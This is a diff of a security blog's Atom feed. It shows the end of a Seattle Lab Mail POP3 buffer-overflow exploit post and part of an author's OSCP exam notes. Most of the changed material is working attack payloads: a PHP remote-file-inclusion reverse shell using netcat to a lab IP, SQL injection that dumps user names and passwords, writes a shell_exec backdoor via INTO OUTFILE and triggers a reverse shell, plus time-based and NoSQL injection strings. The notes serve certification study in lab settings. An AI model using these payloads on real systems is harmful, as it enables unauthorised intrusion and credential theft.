+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;!mona find –s “&lt;span class="se"&gt;\x&lt;/span&gt;ff&lt;span class="se"&gt;\x&lt;/span&gt;e4” –m slmfc.dll
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;The address &lt;strong&gt;0x5f4a358f&lt;/strong&gt; looks good (no bad characters).
@@ -997,7 +1230,7 @@ Replace the EIP (was &lt;strong&gt;BBBB&lt;/strong&gt; previously) in the buffer
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;In Kali Terminal 2&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;python pop3_exploit.py&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python pop3_exploit.py
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Hopefully, Terminal 1 will now give you your reverse shell onto the Windows VM. We have developed an exploit for any similar Windows machine running Seattle Lab Mail.&lt;/p&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>"OSCP: Notes for exam"</title><link href="/oscp-notes.html" rel="alternate"></link><published>2019-10-30T00:00:00-05:00</published><updated>2019-10-30T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-30:/oscp-notes.html</id><summary type="html">&lt;p&gt;Everyone has one. This is mine. A collection of OSCP prep-notes from various other guides and sources over the internet as well as my own experience within the Hack The Box labs and in the Penetration Testing with Kali Linux labs. &lt;/p&gt;
@@ -1447,10 +1680,10 @@ mv shell.txt shell.asp&lt;span class="p"&gt;;&lt;/span&gt;.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h5&gt;RFI: Host evil.txt on apache and serve it as the LANG file&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;“nc&lt;/span&gt; &lt;span class="nx"&gt;–nv&lt;/span&gt; &lt;span class="mf"&gt;10.11&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;0.160&lt;/span&gt; &lt;span class="mi"&gt;4444&lt;/span&gt; &lt;span class="nx"&gt;–e&lt;/span&gt; &lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exe&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);?&amp;gt; # evil.txt on apache&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nc –nv 10.11.0.160 4444 –e cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt; # evil.txt on apache&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;nc –nvlp 4444 # set up listener&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc –nvlp &lt;span class="m"&gt;4444&lt;/span&gt; &lt;span class="c1"&gt;# set up listener&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;code&gt;http://10.11.15.54/addguestbook.php?name=a&amp;amp;comment=b&amp;amp;LANG=http://10.11.0.160/evil.txt%00&lt;/code&gt;&lt;/p&gt;
@@ -1495,65 +1728,61 @@ sysctl.conf
 
 &lt;h4&gt;Websites SQLi + Databases&lt;/h4&gt;
 &lt;p&gt;Enumerating MySQL database in URL&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;webappdb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;
-&lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;where&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;‘&lt;/span&gt;&lt;span class="n"&gt;wronguser&lt;/span&gt;&lt;span class="err"&gt;’&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="k"&gt;and&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wrongpass&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;webappdb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;
+&lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;where&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wronguser&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="k"&gt;and&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wrongpass&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt; &lt;span class="nx"&gt;vulnerability&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nx"&gt;GET&lt;/span&gt; &lt;span class="nx"&gt;requests&lt;/span&gt; 
-&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/comment.php?id=735`&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# URL vulnerability for GET requests &lt;/span&gt;
+http://127.0.0.1/comment.php?id&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;735&lt;/span&gt;
 
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;order&lt;/span&gt; &lt;span class="nx"&gt;by&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;col&lt;/span&gt; &lt;span class="nx"&gt;enumeration&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;works&lt;/span&gt; &lt;span class="nx"&gt;fine&lt;/span&gt;
-&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/comment.php?id=735&lt;/span&gt;
+&lt;span class="c1"&gt;# order by 6 # col enumeration: works fine&lt;/span&gt;
+http://127.0.0.1/comment.php?id&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;735&lt;/span&gt;
 
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;order&lt;/span&gt; &lt;span class="nx"&gt;by&lt;/span&gt; &lt;span class="mf"&gt;7.&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Breaks&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;Pick&lt;/span&gt; &lt;span class="nx"&gt;display&lt;/span&gt; &lt;span class="nx"&gt;field&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;eg5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/comment.php?id=735 &lt;/span&gt;
+&lt;span class="c1"&gt;# order by 7. # Breaks. Pick display field &amp;lt;7(eg5)&lt;/span&gt;
+http://127.0.0.1/comment.php?id&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;735&lt;/span&gt; 
 
-&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;735&lt;/span&gt; &lt;span class="nx"&gt;uinion&lt;/span&gt; &lt;span class="nx"&gt;all&lt;/span&gt; &lt;span class="nx"&gt;select&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;@@&lt;/span&gt;&lt;span class="nx"&gt;version&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Col&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;permit&lt;/span&gt; &lt;span class="nx"&gt;UNION&lt;/span&gt; &lt;span class="nx"&gt;ALL&lt;/span&gt; &lt;span class="nx"&gt;SELECT&lt;/span&gt;
+?id&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;735&lt;/span&gt; uinion all &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;,2,3,4,@@version/user&lt;span class="o"&gt;()&lt;/span&gt;,6  &lt;span class="c1"&gt;# Col# permit UNION ALL SELECT&lt;/span&gt;
 
-&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;735&lt;/span&gt; &lt;span class="nx"&gt;uinion&lt;/span&gt; &lt;span class="nx"&gt;all&lt;/span&gt; &lt;span class="nx"&gt;select&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;
+?id&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;735&lt;/span&gt; uinion all &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;,2,3,4,user&lt;span class="o"&gt;()&lt;/span&gt;,6
 
-&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;table_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;tables&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;…4,table_name,6 FROM information_schema.tables&amp;quot;&lt;/span&gt;
 
-&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;column_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;columns&lt;/span&gt; &lt;span class="nx"&gt;where&lt;/span&gt; &lt;span class="nx"&gt;table_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;…4,column_name,6 FROM information_schema.columns where table_name=&amp;#39;users&amp;#39;&amp;quot;&lt;/span&gt;
 
-&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;users&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;…,4,concat(name,0x3a,password),6 FROM users&amp;quot;&lt;/span&gt;
 
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Reverse&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt;&lt;span class="err"&gt;…&lt;/span&gt; &lt;span class="nx"&gt;SQL&lt;/span&gt; &lt;span class="nx"&gt;puts&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="nx"&gt;execution&lt;/span&gt;
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;put&lt;/span&gt; &lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="nx"&gt;shell_exec&lt;/span&gt; &lt;span class="nx"&gt;into&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="nx"&gt;on&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt;
-&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;‘cmd’&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;into&lt;/span&gt; &lt;span class="nx"&gt;OUTFILE&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;c:/xamp/htdocs/backdoor.php&amp;#39;&lt;/span&gt;
+&lt;span class="c1"&gt;# Reverse shell SQL puts code to file &amp;amp; code execution&lt;/span&gt;
+&lt;span class="c1"&gt;# put php shell_exec into a new file on server&lt;/span&gt;
+&lt;span class="s2"&gt;&amp;quot;…4,&amp;quot;&lt;/span&gt;&amp;lt;?php &lt;span class="nb"&gt;echo&lt;/span&gt; shell_exec&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;‘cmd’&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;?&amp;gt;&lt;span class="s2"&gt;&amp;quot;,6 into OUTFILE &amp;#39;c:/xamp/htdocs/backdoor.php&amp;#39;&amp;quot;&lt;/span&gt;
 
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;setup&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="nx"&gt;listener&lt;/span&gt;
-&lt;span class="nx"&gt;nc&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="nx"&gt;nlvp&lt;/span&gt; &lt;span class="mi"&gt;4444&lt;/span&gt; 
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;execute&lt;/span&gt;
-&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//127.0.0.1/backdoor.php?cmd=nc –nv 10.11.0.160 4444 –e cmd.exe&lt;/span&gt;
+&lt;span class="c1"&gt;# setup a listener&lt;/span&gt;
+nc –nlvp &lt;span class="m"&gt;4444&lt;/span&gt; 
+&lt;span class="c1"&gt;# execute&lt;/span&gt;
+http://127.0.0.1/backdoor.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;nc –nv &lt;span class="m"&gt;10&lt;/span&gt;.11.0.160 &lt;span class="m"&gt;4444&lt;/span&gt; –e cmd.exe
 
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Local&lt;/span&gt; &lt;span class="nx"&gt;web&lt;/span&gt; &lt;span class="nx"&gt;proxy&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;POST&lt;/span&gt; &lt;span class="nx"&gt;requests&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;non&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;Tamper&lt;/span&gt; &lt;span class="nx"&gt;Data&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;intercepts&lt;/span&gt; &lt;span class="nx"&gt;HTTP&lt;/span&gt; &lt;span class="nx"&gt;request&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;edit&lt;/span&gt; &lt;span class="nx"&gt;parameters&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;bypassing&lt;/span&gt; &lt;span class="nx"&gt;client&lt;/span&gt; &lt;span class="nx"&gt;side&lt;/span&gt; &lt;span class="nx"&gt;restrictions&lt;/span&gt;
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;place&lt;/span&gt; &lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="nx"&gt;shell_exec&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="nx"&gt;on&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt;
-&lt;span class="nx"&gt;en&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;union all select 1,2,3,4,&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s1"&gt;&amp;quot;,6 into OUTFILE &amp;#39;&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;/xampp/htdocs/new_backdoor.php%00&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="c1"&gt;# Local web proxy (POST requests = non URL)&lt;/span&gt;
+&lt;span class="c1"&gt;# Tamper Data: intercepts HTTP request =&amp;gt; edit parameters: bypassing client side restrictions&lt;/span&gt;
+&lt;span class="c1"&gt;# place php shell_exec in file on server&lt;/span&gt;
+en &lt;span class="s1"&gt;&amp;#39;union all select 1,2,3,4,&amp;quot;&amp;lt;?php echo shell_exec($_GET[&amp;#39;&lt;/span&gt;cmd&lt;span class="s1"&gt;&amp;#39;]);?&amp;gt;&amp;quot;,6 into OUTFILE &amp;#39;&lt;/span&gt;c:/xampp/htdocs/new_backdoor.php%00&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
 
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;setup&lt;/span&gt; &lt;span class="nx"&gt;listener&lt;/span&gt;
-&lt;span class="nx"&gt;nc&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="nx"&gt;nlvp&lt;/span&gt; &lt;span class="mi"&gt;4444&lt;/span&gt; 
+&lt;span class="c1"&gt;# setup listener&lt;/span&gt;
+nc -nlvp &lt;span class="m"&gt;4444&lt;/span&gt; 
 
-&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//10.11.15.54//new_backdoor.php?cmd=nc -nv 10.11.0.160 4444 -e cmd.exe&lt;/span&gt;
+http://10.11.15.54//new_backdoor.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;nc -nv &lt;span class="m"&gt;10&lt;/span&gt;.11.0.160 &lt;span class="m"&gt;4444&lt;/span&gt; -e cmd.exe
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h5&gt;Mysql Queries: 30s delay to MSSQL, MYSQL, POSTGRESQL&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;# Original Query&lt;/span&gt;
-&lt;span class="err"&gt;SELECT * FROM products WHERE name=&amp;#39;Test&amp;#39;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Original Query&lt;/span&gt;
+SELECT * FROM products WHERE &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h5&gt;Injection values&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;MSSQL&lt;/span&gt;
-&lt;span class="s1"&gt;&amp;#39;; WAITFOR DELAY &amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;30&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;;&lt;/span&gt;
-
-&lt;span class="s1"&gt;# MYSQL&lt;/span&gt;
-&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;-SLEEP&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;30&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
-
-&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;POSTGRESQL&lt;/span&gt;
-&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;pg_sleep&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;30&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
+&lt;h1&gt;MSSQL&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;'; WAITFOR DELAY '00:00:30';&lt;/code&gt;&lt;/p&gt;
+&lt;h1&gt;MYSQL&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;'-SLEEP(30);&lt;/code&gt;&lt;/p&gt;
+&lt;h1&gt;POSTGRESQL&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;'; SELECT pg_sleep(30);&lt;/code&gt;&lt;/p&gt;
 &lt;h5&gt;Resulting queries&lt;/h5&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;MSSQL&lt;/span&gt;
 &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;products&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;WAITFOR&lt;/span&gt; &lt;span class="n"&gt;DELAY&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;00:00:30&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -1577,7 +1806,7 @@ sysctl.conf
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git clone https://github.com/codingo/NoSQLMap.git 
 pip install couchdb&lt;span class="p"&gt;;&lt;/span&gt; pip install pbkdf2&lt;span class="p"&gt;;&lt;/span&gt; pip install ipcalc 
 python nosqlmap.py
-a&lt;span class="s1"&gt;&amp;#39;; return this.a != &amp;#39;&lt;/span&gt;BadData’&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; var &lt;span class="nv"&gt;dummy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;‘!&lt;span class="sb"&gt;`&lt;/span&gt;
